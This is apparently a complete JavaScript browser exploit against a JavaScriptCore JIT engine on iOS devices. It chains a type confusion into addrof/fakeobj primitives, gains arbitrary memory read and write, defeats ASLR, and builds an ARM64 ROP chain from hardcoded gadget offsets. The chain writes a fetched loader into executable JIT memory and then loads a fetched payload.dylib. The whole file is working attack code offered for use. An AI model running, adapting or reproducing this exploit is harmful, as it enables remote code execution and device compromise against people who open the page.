let pre;
function log(s) {
	console.log(s);
	pre.innerText += s+"\n";
}

const ITERS = 10000;
const ALLOCS = 1000;
const MAX_BUFFER_SIZE = 0x1000000;
const BASE32 = 0x100000000;

const f64 = new Float64Array(1);
const u32 = new Uint32Array(f64.buffer);

function f2i(f) {
	f64[0] = f;
	return u32[0] + BASE32 * u32[1];
}

function i2f(i) {
	u32[0] = i % BASE32;
	u32[1] = i / BASE32;
	return f64[0];
}

function hex(x) {
	if (x < 0) return `-${hex(-x)}`;
	return `0x${x.toString(16)}`;
}

const u8_buffer = new Uint8Array(MAX_BUFFER_SIZE);
const f64_buffer = new Float64Array(u8_buffer.buffer);

function pwn(loader_length, payload_length) {
	const stage1 = {
		addrof: function(obj) {
			const orig = Object.getPrototypeOf(Date.prototype);

			const s = new Date();
			const confuse = new Array(13.37,13.37);
			let hack = 0;
			s[1] = 1;
			Date.prototype.__proto__ = new Proxy(Date.prototype.__proto__, {has: function() {
				if (hack) {
					confuse[1] = obj;
				}
			}});

			function victim(o,f64,u32,doubleArray) {
				doubleArray[0];
				const r = 5 in o;
				f64[0] = f64[1] = doubleArray[1];
				doubleArray[1] = f64[1];
				return r;
			}

			const u32 = new Uint32Array(4);
			const f64 = new Float64Array(u32.buffer);
			for(let i=0; i<ITERS; i++) victim(s,f64,u32,confuse);

			hack = 1;
			victim(s,f64,u32,confuse);
			const addr = u32[0]+u32[1]*BASE32;

			hack = 0;
			Object.setPrototypeOf(Date.prototype, orig);
			return addr;
		},

		fakeobj: function(addr) {
			const orig = Object.getPrototypeOf(Date.prototype);

			const s = new Date();
			const confuse = new Array(13.37,13.37);
			let hack = 0;
			s[1] = 1;
			Date.prototype.__proto__ = new Proxy(Date.prototype.__proto__, {has: function() {
				if (hack) {
					confuse[1] = {};
				}
			}});

			function victim(o,f64,u32,doubleArray) {
				doubleArray[0];
				const r = 5 in o;
				f64[0] = f64[1] = doubleArray[1];
				u32[2] = addr % BASE32;
				u32[3] = addr / BASE32;
				doubleArray[1] = f64[1];
				return r;
			}

			const u32 = new Uint32Array(4);
			const f64 = new Float64Array(u32.buffer);
			for(let i=0; i<ITERS; i++) victim(s,f64,u32,confuse);

			hack = 1;
			victim(s,f64,u32,confuse);

			hack = 0;
			Object.setPrototypeOf(Date.prototype, orig);
			return confuse[1];
		},

		test: function() {
			const addr = this.addrof({a: 0x1337});
			const obj = this.fakeobj(addr);
			if (obj.a != 0x1337) {
				throw new Error("stage1");
			}
		},
	};

	// Sanity check
	stage1.test();
	log("[+] Achieved limited arbitrary read/write \\o/");

	const structure_spray = [];
	for (let i = 0; i < ALLOCS; ++i) {
		const ary = {a:1,b:2,c:3,d:4,e:5,f:6,g:0xfffffff};
		ary["prop"+i] = 1;
		structure_spray.push(ary);
	}

	const manager = structure_spray[500];
	const leak_addr = stage1.addrof(manager);
	//log("[*] leaking from: "+ hex(leak_addr));

	function alloc_above_manager(expr) {
		let res;
		do {
			for (let i = 0; i < ALLOCS; ++i) {
				structure_spray.push(eval(expr));
			}
			res = eval(expr);
		} while (stage1.addrof(res) < leak_addr);
		return res;
	}

	const unboxed_size = 100;

	const unboxed = alloc_above_manager("[" + "13.37,".repeat(unboxed_size) + "]");
	const boxed = alloc_above_manager("[{}]");
	const victim = alloc_above_manager("[]");

	// Will be stored out-of-line at butterfly - 0x10
	victim.p0 = 0x1337;
	function victim_write(val) {
		victim.p0 = val;
	}
	function victim_read() {
		return victim.p0;
	}

	u32[0] = 0x200;                // Structure ID
	u32[1] = 0x01082007 - 0x10000; // Fake JSCell metadata, adjusted for boxing
	let outer = {
		p1: f64[0],
		p2: manager,
		p3: 0xfffffff, // Butterfly indexing mask
	};

	const fake_addr = stage1.addrof(outer) + 0x10;
	//log("[*] fake obj @ " + hex(fake_addr));

	const unboxed_addr = stage1.addrof(unboxed);
	const boxed_addr = stage1.addrof(boxed);
	const victim_addr = stage1.addrof(victim);
	//log("[*] leak " + hex(leak_addr)
	//	+ "\nunboxed " + hex(unboxed_addr)
	//	+ "\nboxed " + hex(boxed_addr)
	//	+ "\nvictim " + hex(victim_addr)
	//);

	const holder = {fake: {}};
	holder.fake = stage1.fakeobj(fake_addr);

	// From here on GC would be uncool

	// Share a butterfly for easier boxing/unboxing
	const shared_butterfly = f2i(holder.fake[(unboxed_addr + 8 - leak_addr) / 8]);
	//const boxed_butterfly = holder.fake[(boxed_addr + 8 - leak_addr) / 8];
	holder.fake[(boxed_addr + 8 - leak_addr) / 8] = i2f(shared_butterfly);

	const victim_butterfly = holder.fake[(victim_addr + 8 - leak_addr) / 8];
	function set_victim_addr(where) {
		holder.fake[(victim_addr + 8 - leak_addr) / 8] = i2f(where + 0x10);
	}
	function reset_victim_addr() {
		holder.fake[(victim_addr + 8 - leak_addr) / 8] = victim_butterfly;
	}

	const stage2 = {
		addrof: function(obj) {
			boxed[0] = obj;
			return f2i(unboxed[0]);
		},

		fakeobj: function(addr) {
			unboxed[0] = i2f(addr);
			return boxed[0];
		},

		write64: function(where, what) {
			set_victim_addr(where);
			victim_write(stage1.fakeobj(what));
			reset_victim_addr();
		},

		read64: function(where) {
			set_victim_addr(where);
			const res = this.addrof(victim_read());
			reset_victim_addr();
			return res;
		},

		write_non_zero: function(where, values) {
			for (let i = 0; i < values.length; ++i) {
				if (values[i] != 0)
					this.write64(where + i*8, values[i]);
			}
		},

		test: function() {
			if (this.read64(boxed_addr + 8) > 0xffffffffffff) {
				throw new Error("stage2");
			}
		},

		forge: function(values) {
			for (let i = 0; i < values.length; ++i)
				unboxed[1 + i] = i2f(values[i]);
			return shared_butterfly + 8;
		},

		clear: function() {
			outer = null;
			holder.fake = null;
			for (var i = 0; i < unboxed_size; ++i)
				boxed[0] = null;
		},
	};

	// Test read/write
	stage2.test();
	log("[+] Got stable arbitrary memory read/write!");

	const wrapper = document.createElement("div");

	const wrapper_addr = stage2.addrof(wrapper);
	const el_addr = stage2.read64(wrapper_addr + 0x18);
	const vtab_addr = stage2.read64(el_addr);

	// Various offsets here
	const slide = stage2.read64(vtab_addr) - 0x018a4194e8;
	const dlsym = 0x0180919a08 + slide;

	const base = stage2.read64(0x01b9d51c60 + slide);
	const startOfFixedExecutableMemoryPool = stage2.read64(base + 0xc8);
	const endOfFixedExecutableMemoryPool = stage2.read64(base + 0xd0);
	const jitWriteSeparateHeapsFunction = stage2.read64(0x01b9d53058 + slide);
	const useFastPermisionsJITCopy = stage2.read64(0x01b7e54018 + slide);

	// 0x000000019cb5acf4 :
	//   ldr x0, [x0, #0x18]
	//   ldr x1, [x0, #0x40]
	//   br x1
	const gadget_0 = 0x019cb5acf4 + slide;

	// 0x00000001815d32d4 :
	//   ldr x0, [x0]
	//   ldr x4, [x0, #0x10]
	//   br x4
	const gadget_1 = 0x01815d32d4 + slide;

	// 0x00000001a9447468 :
	//   ldp x8, x1, [x0, #0x20]
	//   ldp x2, x0, [x8, #0x20]
	//   br x2
	const gadget_2 = 0x01a9447468 + slide;

	// 0x0000000194d29dc8 :
	//   stp x8, x1, [sp]
	//   ldr x8, [x0]
	//   ldr x8, [x8, #0x60]
	//   mov x1, sp
	//   blr x8
	const gadget_3 = 0x0194d29dc8 + slide;

	// 0x00000001800b78ec :
	//   ldp x0, x1, [sp, #0x80]
	//   ldp x2, x3, [sp, #0x90]
	//   ldp x4, x5, [sp, #0xa0]
	//   ldp x6, x7, [sp, #0xb0]
	//   ldr x8, [sp, #0xc0]
	//   mov sp, x29
	//   ldp x29, x30, [sp], #0x10
	//   ret
	const gadget_4 = 0x01800b78ec + slide;

	// 0x000000018d2de38c :
	//   ldr x8, [sp, #8]
	//   blr x8
	//   ldp x29, x30, [sp, #0x20]
	//   add sp, sp, #0x30
	//   ret
	const gadget_5 = 0x018d2de38c + slide;

	log("[*] el_addr: " + hex(el_addr)
		+ "\nstartOfFixedExecutableMemoryPool: " + hex(startOfFixedExecutableMemoryPool)
		+ "\nendOfFixedExecutableMemoryPool: " + hex(endOfFixedExecutableMemoryPool)
		+ "\njitWriteSeparateHeapsFunction: " + hex(jitWriteSeparateHeapsFunction)
		+ "\nuseFastPermisionsJITCopy: " + hex(useFastPermisionsJITCopy)
		+ "\ngadget_0: " + hex(gadget_0)
		+ "\ngadget_1: " + hex(gadget_1)
		+ "\ngadget_2: " + hex(gadget_2)
		+ "\ngadget_3: " + hex(gadget_3)
		+ "\ngadget_4: " + hex(gadget_4)
		+ "\ngadget_5: " + hex(gadget_5)
	);

	if (!useFastPermisionsJITCopy || jitWriteSeparateHeapsFunction) {
		// Probably an older phone, should be even easier
	} else {
		throw new Error("A12+ not supported!");
	}

	const buffer_addr = stage2.read64(stage2.addrof(u8_buffer) + 0x10);

	const loader_src = buffer_addr + 0x8000;
	const loader_dst = endOfFixedExecutableMemoryPool - MAX_BUFFER_SIZE;
	if (loader_dst < startOfFixedExecutableMemoryPool) {
		throw new Error("loader_dst");
	}

	const payload_addr = buffer_addr + 0x10000;
	f64_buffer[0x8000/8+1] = i2f(payload_addr);
	f64_buffer[0x8000/8+2] = i2f(dlsym);
	f64_buffer[0x8000/8+3] = i2f(startOfFixedExecutableMemoryPool);
	f64_buffer[0x8000/8+4] = i2f(endOfFixedExecutableMemoryPool);
	f64_buffer[0x8000/8+5] = i2f(jitWriteSeparateHeapsFunction);

	const fake_stack_addr = buffer_addr + 0x2000;
	const fake_stack = [
		gadget_0,
		fake_stack_addr,
		gadget_2,
		fake_stack_addr,
		fake_stack_addr + 0x30,
		gadget_4 + 0x14,
		fake_stack_addr + 0x70,
		gadget_4,
		0,
		gadget_1,
		gadget_3,
		fake_stack_addr + 0x18,
		gadget_4 + 0x18,
		0,
		0,
		gadget_5,
		0,
		jitWriteSeparateHeapsFunction,
		0,
		0,
		0,
		loader_dst,
		0,
		0,
		loader_dst - startOfFixedExecutableMemoryPool,
		loader_src,
		loader_length,
	];

	for (let i = 0; i < fake_stack.length; ++i) {
		f64_buffer[0x2000/8+i] = i2f(fake_stack[i]);
	}

	stage2.write_non_zero(el_addr, [
		fake_stack_addr,
		0,
		0,
		fake_stack_addr + 0x08,
	]);
	alert("see you on the other side");
	wrapper.addEventListener("click", function(){});
}

async function go() {
	const loader = await fetch("loader.bin");
	const loader_buffer = await loader.arrayBuffer();
	const loader_length = loader_buffer.byteLength;
	if (loader_length > 0x8000) {
		throw new Error("loader_length");
	}
	u8_buffer.set(new Uint8Array(loader_buffer), 0x8000);

	const payload = await fetch("payload.dylib");
	const payload_buffer = await payload.arrayBuffer();
	const payload_length = payload_buffer.byteLength;
	if (payload_length > MAX_BUFFER_SIZE - 0x10000) {
		throw new Error("payload_length");
	}
	u8_buffer.set(new Uint8Array(payload_buffer), 0x10000);

	log(`[i] got ${loader_length} bytes of loader, ${payload_length} bytes of payload, pwning`);
	pwn(loader_length, payload_length);
}

document.addEventListener("DOMContentLoaded", (event) => {
	pre = document.getElementById("log");
	document.getElementById("pwn").addEventListener("click", (evt) => {
		go().catch((e) => {
			log("[-] " + e + "\n" + e.stack);
		});
	});
});
